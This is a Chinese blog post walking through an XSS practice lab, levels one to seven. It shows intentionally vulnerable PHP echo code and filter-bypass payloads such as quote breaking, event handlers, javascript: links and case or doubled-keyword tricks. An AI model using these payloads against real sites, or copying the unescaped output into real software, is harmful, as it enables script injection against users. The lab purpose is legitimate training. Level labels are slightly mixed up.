@@ -1,0 +1,810 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="XSS," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="jianghuxia's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="跨站脚本攻击（Cross Site Script），为避免与（Cascading Style Sheet，CSS）重名，安全领域我们称为”XSS”。">
+<meta name="keywords" content="XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss练习（一）">
+<meta property="og:url" content="https://jianghuxia.github.io/2019/08/15/xss练习（一）/index.html">
+<meta property="og:site_name" content="jianghuxia&#39;s blog">
+<meta property="og:description" content="跨站脚本攻击（Cross Site Script），为避免与（Cascading Style Sheet，CSS）重名，安全领域我们称为”XSS”。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://jianghuxia.github.io/2019/08/15/xss练习（一）/1563429270010.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2019/08/15/xss练习（一）/1563429508980.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2019/08/15/xss练习（一）/1563429982390.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2019/08/15/xss练习（一）/1563430430408.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2019/08/15/xss练习（一）/1563431340960.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2019/08/15/xss练习（一）/1563431750880.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2019/08/15/xss练习（一）/1563431840352.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2019/08/15/xss练习（一）/1563432004678.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2019/08/15/xss练习（一）/1563432391276.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2019/08/15/xss练习（一）/1563433304093.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2019/08/15/xss练习（一）/1563433656626.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2019/08/15/xss练习（一）/1563434726338.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2019/08/15/xss练习（一）/1563435580009.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2019/08/15/xss练习（一）/1563435873082.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2019/08/15/xss练习（一）/1563436791819.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2019/08/15/xss练习（一）/1563438053795.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2019/08/15/xss练习（一）/1563438113970.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2019/08/15/xss练习（一）/1563438796204.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2019/08/15/xss练习（一）/1563440063733.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2019/08/15/xss练习（一）/1563441204204.png">
+<meta property="og:updated_time" content="2019-09-02T09:40:20.579Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="xss练习（一）">
+<meta name="twitter:description" content="跨站脚本攻击（Cross Site Script），为避免与（Cascading Style Sheet，CSS）重名，安全领域我们称为”XSS”。">
+<meta name="twitter:image" content="https://jianghuxia.github.io/2019/08/15/xss练习（一）/1563429270010.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://jianghuxia.github.io/2019/08/15/xss练习（一）/"/>
+
+
+
+
+
+  <title>xss练习（一） | jianghuxia's blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" color="0,0,255" opacity='0.5' zIndex="-1" count="10"  src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">jianghuxia's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Everyday very nice!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://jianghuxia.github.io/2019/08/15/xss练习（一）/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="jianghuxia">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/person_image.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jianghuxia's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">xss练习（一）</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-15T16:36:53+08:00">
+                2019-08-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>跨站脚本攻击（Cross Site Script），为避免与（Cascading Style Sheet，CSS）重名，安全领域我们称为”XSS”。<br><a id="more"></a> </p>
+<h1 id="XSS练习"><a href="#XSS练习" class="headerlink" title="XSS练习"></a>XSS练习</h1><h2 id="第一关——无任何过滤"><a href="#第一关——无任何过滤" class="headerlink" title="第一关——无任何过滤"></a>第一关——无任何过滤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line"> confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level2.php?keyword=test&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level1&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;name&quot;];</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>其中核心代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"name"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;欢迎用户"</span>.$str.<span class="string">"&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过<code>GET</code>方式将<code>name</code>的参数值传进去，无任何过滤，如下图，传参<code>ghjkl</code>进去</p>
+<p><img src="/2019/08/15/xss练习（一）/1563429270010.png" alt="1563429270010"></p>
+<p>当攻击者恶意构造如下<code>pyload</code>，将会触发<code>js</code>弹窗</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/08/15/xss练习（一）/1563429508980.png" alt="1563429508980"></p>
+<h2 id="第二关——htmlspecialchars-str-部分转化"><a href="#第二关——htmlspecialchars-str-部分转化" class="headerlink" title="第二关——htmlspecialchars($str)部分转化"></a>第二关——<code>htmlspecialchars($str)</code>部分转化</h2><p>核心代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value="搜索"/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我们先尝试下<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
+<p><img src="/2019/08/15/xss练习（一）/1563429982390.png" alt="1563429982390"></p>
+<p>发现<code>&lt;</code>被转换为 <code>&amp;lt;</code>、<code>&gt;</code>被转换为<code>&amp;gt;</code>，仔细查看代码，<code>htmlspecialchars</code>将这些特殊字符转换为 HTML 实体，那现在该怎么办呢？我们发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>我们所填的内容填充在这个文本框中，想想，我们是否可以填入<code>&quot;</code>，将其<code>value</code>的值置为空，闭合双引号，致使input的标签提前结束，后面接着输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>即可弹窗，即最终显示的网页源代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>稍稍构造，成功触发</p>
+<p><img src="/2019/08/15/xss练习（一）/1563430430408.png" alt="1563430430408"></p>
+<p>第二关<code>pyload</code>:<code>http://127.0.0.1/xss/level2.php?keyword=&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;&quot;</code></p>
+<h2 id="第三关——htmlspecialchars-str-全部转化-单引号"><a href="#第三关——htmlspecialchars-str-全部转化-单引号" class="headerlink" title="第三关——htmlspecialchars($str)全部转化(单引号)"></a>第三关——<code>htmlspecialchars($str)</code>全部转化(单引号)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">"&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value='"</span>.htmlspecialchars($str).<span class="string">"'&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>完蛋！这下可咋整呀，这个也过滤掉了。</p>
+<p><img src="/2019/08/15/xss练习（一）/1563431340960.png" alt="1563431340960"></p>
+<p>难道弹窗只有<code>script</code>这一种方式吗？有其他的吗？当然有呀。比如我们接下来说的<code>onmouseover=&#39;alert(/xss/)&#39;</code></p>
+<p>通过上面我们发现<code>”</code>、<code>&lt;</code>、<code>&gt;</code>都被转化为<code>html</code>的实体参数了，那单引号呢？我们试试</p>
+<p><img src="/2019/08/15/xss练习（一）/1563431750880.png" alt="1563431750880"></p>
+<p>嗯呢，看来单引号并没有被转化为其他，我们试试刚刚的<code>onmouseover=&#39;alert(/xss/)&#39;</code></p>
+<p><img src="/2019/08/15/xss练习（一）/1563431840352.png" alt="1563431840352"></p>
+<p>很好，接下来只要我们闭合单引号就行啦</p>
+<p><img src="/2019/08/15/xss练习（一）/1563432004678.png" alt="1563432004678"></p>
+<p>第三关<code>pyload</code>:<code>http://127.0.0.1/xss/level3.php?keyword=&#39;onmouseover=&#39;alert(/xss/)</code></p>
+<h2 id="第四关——htmlspecialchars-str-部分转化-双引号拼接、过滤-lt-和-gt"><a href="#第四关——htmlspecialchars-str-部分转化-双引号拼接、过滤-lt-和-gt" class="headerlink" title="第四关——htmlspecialchars($str)部分转化(双引号拼接、过滤&lt;和&gt;)"></a>第四关——<code>htmlspecialchars($str)</code>部分转化(双引号拼接、过滤<code>&lt;</code>和<code>&gt;</code>)</h2><p>抱着侥幸的心理，去试试第三关的答案能不能过第四关</p>
+<p><img src="/2019/08/15/xss练习（一）/1563432391276.png" alt="1563432391276"></p>
+<p>顺便看下源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>过滤了<code>&lt;</code>、<code>&gt;</code>，但是我们注意到<code>input</code>标签没过滤，估摸着<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>用不了了，我们试试改改上关用的，需要注意的也只有是双引号闭合即可，故构造<code>&quot;onmouseover=&quot;alert(/xss/)</code></p>
+<p><img src="/2019/08/15/xss练习（一）/1563433304093.png" alt="1563433304093"></p>
+<p>第四关<code>pyload</code>:<code>http://127.0.0.1/xss/level4.php?keyword=&quot;onmouseover=&quot;alert(/xss/)</code></p>
+<h2 id="第五关——htmlspecialchars-str-部分转化-双引号拼接、strtolower-、将on转化0-n"><a href="#第五关——htmlspecialchars-str-部分转化-双引号拼接、strtolower-、将on转化0-n" class="headerlink" title="第五关——htmlspecialchars($str)部分转化(双引号拼接、strtolower()、将on转化0_n)"></a>第五关——<code>htmlspecialchars($str)</code>部分转化(双引号拼接、<code>strtolower()</code>、将<code>on</code>转化<code>0_n</code>)</h2><p><img src="/2019/08/15/xss练习（一）/1563433656626.png" alt="1563433656626"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>嗯~过滤掉了<code>on</code>和&lt;script，大小写绕过？但是<code>strtolower()</code>会将传入的参数先全部转换为小写，在进行匹配。咋办？</p>
+<p>那我自己重新建个标签呗。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)</span><br></pre></td></tr></table></figure>
+<p>第五关<code>pyload</code>:<code>http://127.0.0.1/xss/level5.php?keyword=&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)</code></p>
+<h2 id="第六关——htmlspecialchars-str-部分转化-双引号拼接、无strtolower-、将on转化0-n、src转化sr-c、data转化da-ta、href转化hr-ef"><a href="#第六关——htmlspecialchars-str-部分转化-双引号拼接、无strtolower-、将on转化0-n、src转化sr-c、data转化da-ta、href转化hr-ef" class="headerlink" title="第六关——htmlspecialchars($str)部分转化(双引号拼接、无strtolower()、将on转化0_n、src转化sr_c、data转化da_ta、href转化hr_ef)"></a>第六关——<code>htmlspecialchars($str)</code>部分转化(双引号拼接、无<code>strtolower()</code>、将<code>on</code>转化<code>0_n</code>、<code>src</code>转化<code>sr_c</code>、<code>data</code>转化<code>da_ta</code>、<code>href</code>转化<code>hr_ef</code>)</h2><p><img src="/2019/08/15/xss练习（一）/1563434726338.png" alt="1563434726338"></p>
+<p>查看对应源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level6.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str6.&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>怎么办，又自闭了。我们回顾一下几种利用方式</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(/xss/)"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keword</span> <span class="attr">value</span>=<span class="string">'hello'</span> <span class="attr">onmouseover</span>=<span class="string">"alert(/xss/)"</span>&gt;</span>	//鼠标移动到输入框触发</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keword</span> <span class="attr">value</span>=<span class="string">'hello'</span> <span class="attr">onfocus</span>=<span class="string">"alert(/xss/)"</span>&gt;</span> 		//鼠标点击输入框触发</span><br></pre></td></tr></table></figure>
+<p>但是仔细看看，你会发现，没有上一关的<code>strtolower()</code>，哈哈，那改下大小写不就行了</p>
+<p><img src="/2019/08/15/xss练习（一）/1563435580009.png" alt="1563435580009"></p>
+<p>第六关<code>pyload</code>:<code>http://127.0.0.1/xss/level6.php?keyword=&quot;&gt;&lt;ScRIpt&gt;alert(/xss/)&lt;/sCrIPt&gt;&lt;&quot;</code></p>
+<h2 id="第七关——htmlspecialchars-str-部分转化-双引号拼接、无strtolower-、将script、on、src、data、href转化"><a href="#第七关——htmlspecialchars-str-部分转化-双引号拼接、无strtolower-、将script、on、src、data、href转化" class="headerlink" title="第七关——htmlspecialchars($str)部分转化(双引号拼接、无strtolower()、将script、on、src、data、href转化)"></a>第七关——<code>htmlspecialchars($str)</code>部分转化(双引号拼接、无<code>strtolower()</code>、将<code>script</code>、<code>on</code>、<code>src</code>、<code>data</code>、<code>href</code>转化<code></code>)</h2><p><img src="/2019/08/15/xss练习（一）/1563435873082.png" alt="1563435873082"></p>
+<p>查看下源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str =strtolower( $_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level7.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str6.&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><code>scScRIptript</code>—-&gt;<code>script</code>，懂我意思了吧</p>
+<p>第六关<code>pyload</code>:<code>http://127.0.0.1/xss/level6.php?keyword=&quot;&gt;&lt;scScRIptript&gt;alert(/xss/)&lt;/scrsCrIPtipt&gt;&lt;&quot;</code></p>
+<p><img src="/2019/08/15/xss练习（一）/1563436791819.png" alt="1563436791819"></p>
